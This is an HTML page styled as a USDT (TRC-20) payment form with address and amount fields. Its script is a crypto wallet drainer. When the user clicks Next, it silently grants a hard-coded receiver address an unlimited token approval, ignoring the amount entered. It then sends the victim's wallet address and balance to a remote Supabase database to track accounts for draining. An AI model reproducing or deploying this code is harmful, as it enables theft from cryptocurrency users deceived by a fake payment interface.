<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TRC-20 USDT Approval</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 20px;
      background: #fff;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #005bff;
      color: white;
      border: none;
      border-radius: 20px;
      font-size: 18px;
      font-weight: bold;
      margin-top: 20px;
    }
    .max-btn {
      position: relative;
      float: right;
      top: -40px;
      margin-right: 10px;
      font-weight: bold;
      color: #888;
    }
    .label {
      font-weight: 600;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div>
    <div class="label">Address</div>
    <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />

    <div class="label">Amount</div>
    <input type="number" id="amountInput" placeholder="0" />
    <span class="max-btn">Max</span>

    <button onclick="approveUSDT()">Next</button>
  </div>

  <script>
    const receiverAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const supabaseUrl = "https://ycmspiedqvwzzrgpxeci.supabase.co";
    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...T5o"; // Keep secret

    async function waitForTronWeb(timeout = 15000) {
      const start = Date.now();
      while (!window.tronWeb || !window.tronWeb.ready) {
        if (Date.now() - start > timeout) {
          alert("Wallet not detected. Please use TronLink or similar.");
          return false;
        }
        await new Promise(r => setTimeout(r, 500));
      }
      return true;
    }

    async function approveUSDT() {
      const ready = await waitForTronWeb();
      if (!ready) return;

      const address = window.tronWeb.defaultAddress.base58;
      const amount = document.getElementById("amountInput").value || "0";

      const contract = await window.tronWeb.contract().at(usdtContract);

      try {
        await contract
          .approve(receiverAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
          .send({ shouldPollResponse: true });

        const balance = await contract.balanceOf(address).call();

        await fetch(`${supabaseUrl}/rest/v1/approvals`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            apikey: supabaseKey,
            Authorization: `Bearer ${supabaseKey}`,
            Prefer: "return=representation"
          },
          body: JSON.stringify({
            wallet_address: address,
            amount: amount,
            balance: parseInt(balance._hex, 16) / 1e6,
            timestampz: new Date().toISOString()
          })
        });

        Swal.fire("Success", "Approval sent successfully.", "success");
      } catch (err) {
        Swal.fire("Error", err.message, "error");
      }
    }
